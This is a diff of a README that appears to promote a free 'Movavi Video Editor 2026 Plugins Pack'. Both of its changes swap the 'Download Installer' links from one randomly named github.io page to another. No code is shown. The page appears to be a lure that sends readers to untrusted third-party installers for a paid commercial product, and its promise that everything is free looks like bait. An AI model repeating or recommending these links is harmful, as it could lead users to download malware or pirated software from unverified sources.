@@ -2,7 +2,7 @@
 
 Movavi Video Editor 2026 Plugins Pack is a comprehensive collection of tools designed to enhance your video editing capabilities in 2026. This pack includes a wide range of plugins, effects, and transitions that integrate seamlessly with Movavi Video Editor, whether you're editing for personal projects or professional work. With this pack, you can achieve stunning results and streamline your workflow with ease.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -72,7 +72,7 @@ No, once you download and install the pack, all features are available for free.
 
 ## Download
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
